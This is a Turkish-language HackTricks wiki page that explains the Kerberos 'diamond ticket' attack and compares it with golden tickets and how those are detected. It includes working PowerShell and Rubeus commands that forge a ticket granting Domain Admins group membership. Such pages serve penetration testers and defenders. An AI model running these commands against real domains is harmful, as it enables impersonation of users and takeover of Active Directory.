# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Altın bilet gibi**, bir diamond ticket, **herhangi bir kullanıcı olarak herhangi bir hizmete erişmek için kullanılabilen bir TGT'dir**. Altın bilet tamamen çevrimdışı olarak, o alanın krbtgt hash'i ile şifrelenerek sahte olarak oluşturulur ve ardından kullanmak için bir oturum açma oturumuna geçirilir. Alan denetleyicileri, TGT'leri izlememekte olduklarından, (veya onlar) meşru olarak verilmiş olanları, kendi krbtgt hash'i ile şifrelenmiş TGT'leri memnuniyetle kabul ederler.

Altın biletlerin kullanımını tespit etmek için iki yaygın teknik vardır:

- Karşılık gelen AS-REQ olmayan TGS-REQ'leri arayın.
- Mimikatz'ın varsayılan 10 yıllık ömrü gibi saçma değerlere sahip TGT'leri arayın.

Bir **diamond ticket**, **bir DC tarafından verilen meşru bir TGT'nin alanlarını değiştirmek suretiyle** yapılır. Bu, **bir TGT talep ederek**, alanın krbtgt hash'i ile **şifre çözerek**, biletin istenen alanlarını **değiştirerek** ve ardından **yeniden şifreleyerek** gerçekleştirilir. Bu, bir altın biletin daha önce bahsedilen iki eksikliğini **aşar** çünkü:

- TGS-REQ'lerin önünde bir AS-REQ olacaktır.
- TGT, bir DC tarafından verildiği için alanın Kerberos politikasından tüm doğru ayrıntılara sahip olacaktır. Bu ayrıntılar bir altın bilette doğru bir şekilde sahte olarak oluşturulabilse de, daha karmaşık ve hatalara açıktır.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
